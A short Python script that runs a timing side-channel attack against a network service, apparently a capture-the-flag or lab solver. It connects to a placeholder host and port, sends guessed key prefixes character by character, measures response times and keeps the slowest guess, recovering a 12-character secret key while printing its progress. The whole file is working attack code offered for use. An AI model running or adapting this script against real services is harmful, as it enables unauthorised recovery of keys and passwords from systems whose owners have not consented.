import socket
from time import time
import struct

HOST = ""
PORT = 00000
INIT_RECV = 1
BUF_SIZE = 64
ALPHABET = ""
KEY_SIZE = 12


def main():

    # connection
    s = socket.socket()
    s.connect((HOST, PORT))

    # n recv
    for i in range(INIT_RECV):
        recv_buf = s.recv(BUF_SIZE)
        print(f"{i+1}e recv : {recv_buf}")

    stats = []
    key = ""
    print(f"----Launching the attack----")
    for i in range(KEY_SIZE):
        stats.append([])

        for char in ALPHABET:
            key += char

            start = time()

            s.send(key.encode())
            recv_buf = s.recv(BUF_SIZE)

            delta = time() - start

            stats[i].append(delta)

            key = key[:-1]

        print(stats[i])
        print(stats[i].index(max(stats[i])))
        print(ALPHABET[stats[i].index(max(stats[i]))])
        key += ALPHABET[stats[i].index(max(stats[i]))]

        print(f"current key : {key} ---- Completed at {((i+1)*100)/KEY_SIZE}%")

    return 0


if __name__ == "__main__":
    main()
